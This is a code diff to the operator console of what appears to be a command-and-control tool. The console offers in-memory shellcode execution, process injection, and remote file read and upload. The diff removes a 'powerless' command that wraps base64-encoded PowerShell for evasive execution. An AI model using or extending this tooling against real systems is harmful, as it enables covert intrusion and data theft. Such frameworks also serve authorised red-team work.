@@ -36,7 +36,6 @@ class Cli:
         self.shell_cmds["delay"] = self.update_delay
         self.shell_cmds["exec"] = self.exec_code
         self.shell_cmds["ps"] = self.ps
-        self.shell_cmds["powerless"] = self.powerless
         self.shell_cmds["inject"] = self.inject
         self.shell_cmds["alias"] = self.set_alias
         self.shell_cmds["background"] = None
@@ -234,11 +233,11 @@ class Cli:
     def show_help_shell(self, data):
         print("\nHelp Menu\n"+"="*9)
         print("\n"+ tabulate({
-            "Commands":["background","fetch","exec","read","upload","ps","powerless","inject","alias","delay","help"],
-            "Args":["","","path/url, cmd","path/url","remote path","path/url, path","","powershell cmd","pid, command","key, value","milliseconds"],
+            "Commands":["background","fetch","exec","read","upload","ps","inject","alias","delay","help"],
+            "Args":["","","path/url, cmd","path/url","remote path","path/url, path","pid, command","key, value","milliseconds"],
             "Descriptions":["Return to the main console","In memory execution of a script and execute a command",
                             "In memory execution of code (shellcode)","Read a file on the remote host","Upload a file on the remote system",
-                            "List processes","Execute Powershell command without invoking Powershell","Inject command into a target process (max length 4096)",
+                            "List processes","Inject command into a target process (max length 4096)",
                             "Create an alias to avoid typing the same thing over and over","Update the callback delay","show this help menu"]
         }, headers='keys', tablefmt="simple"))
         self.alias.list_alias()
@@ -327,18 +326,6 @@ class Cli:
         else:
             UI.error("Cannot fetch the resource")
             return data
-
-    def powerless(self, data):
-        try:
-            cmd, ps_cmd = data.split(" ", 1)
-        except:
-            UI.error("Missing arguments")
-            return ""
-               
-        ps = Utils.load_powershell_script("powerless.ps1", 22)
-        ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(ps_cmd))
-        return ps
-
 
     def inject(self, data):
         try:
